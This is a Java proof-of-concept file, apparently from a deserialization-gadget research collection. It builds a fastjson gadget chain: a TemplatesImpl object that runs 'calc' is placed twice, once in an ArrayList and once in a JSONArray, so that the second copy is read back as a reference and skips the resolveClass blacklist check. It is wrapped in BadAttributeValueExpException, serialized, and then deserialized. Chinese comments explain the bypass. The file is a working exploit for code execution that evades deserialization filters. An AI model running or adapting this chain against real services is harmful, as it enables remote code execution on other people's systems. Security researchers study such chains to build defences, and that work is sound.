package gadget.fastjson;


import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Base64;

import gadget.doubleunser.MyInputStream;
import javassist.*;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import java.lang.reflect.Field;
import java.util.List;


/**
 * 反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，
 * 之后恢复BadAttributeValueExpException对象
 * 在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象
 * 会触发JSONArray/JSONObject的readObject方法，
 * 将这个过程委托给SecureObjectInputStream，
 * 在恢复JSONArray/JSONObject中的TemplatesImpl对象时，
 * 由于此时的第二个TemplatesImpl对象是引用类型，
 * 通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过
 */
public class FJ1{
    public static void main(String[] args) throws Exception{

        List<Object> list = new ArrayList<>();

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");

        list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);           //此时在handles这个hash表中查到了映射，后续则会以引用形式输出

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(bd,"val",jsonArray);

        list.add(bd);

        //字节
        byte[] payload = SerializerUtils.serialize(list);

        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));  //BadAttributeValueExpException,TemplatesImpl被过滤，不可用
        ois.readObject();

    }
}

